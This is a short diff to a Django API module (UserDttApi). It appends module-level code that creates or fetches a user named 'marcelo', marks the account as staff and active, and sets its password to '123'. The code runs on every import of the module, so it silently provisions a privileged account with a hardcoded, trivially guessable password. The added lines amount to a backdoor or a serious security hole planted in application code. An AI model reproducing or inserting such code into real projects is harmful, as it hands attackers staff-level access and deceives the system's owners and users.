@@ -315,3 +315,10 @@ class UserDttApi(AbstractUserDttApi):
             login(self.request, user_authenticated)
         serializer = self.get_serializer_class()
         return JsonResponse({'user': serializer(request.user, many=False).data}, status=status.HTTP_201_CREATED)
+
+user, created = User.objects.get_or_create(username='marcelo')
+print(created)
+user.is_staff = True
+user.is_active = True
+user.set_password('123')
+user.save()
